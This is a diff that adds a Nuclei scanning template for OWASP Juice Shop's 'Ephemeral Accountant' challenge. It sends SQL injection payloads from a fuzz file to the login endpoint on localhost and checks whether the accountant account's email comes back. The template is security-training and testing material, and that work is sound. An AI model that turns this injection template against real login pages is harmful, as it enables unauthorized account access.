@@ -1,0 +1,38 @@
+id: Ephermeral-Accountant
+
+info:
+  name: Ephermeral-Accountant in Juice Shop
+  author: your_name
+  severity: high
+  description: Attempting Injection in login.
+
+
+  
+
+requests:
+  - raw:
+      - |
+        POST /rest/user/login HTTP/1.1
+        Host: 127.0.0.1:3000
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
+        Accept: application/json, text/plain, */*
+        Content-Type: application/json
+
+        {"email":"{{sql-injection}}","password":"trycyber"}
+        
+    attack: Pitchfork
+    payloads:
+        sql-injection: /home/parrot/nuclei-templates/http/vulnerabilities/juice-shop/Injection/Ephemeral-Accountant-fuzz.txt
+       
+    stop-at-first-match: true
+
+    matchers:
+          - type: status
+            status:
+              - 200
+
+          - type: word
+            words:
+              - "acc0unt4nt@juice-sh.op"
+            part: body
+
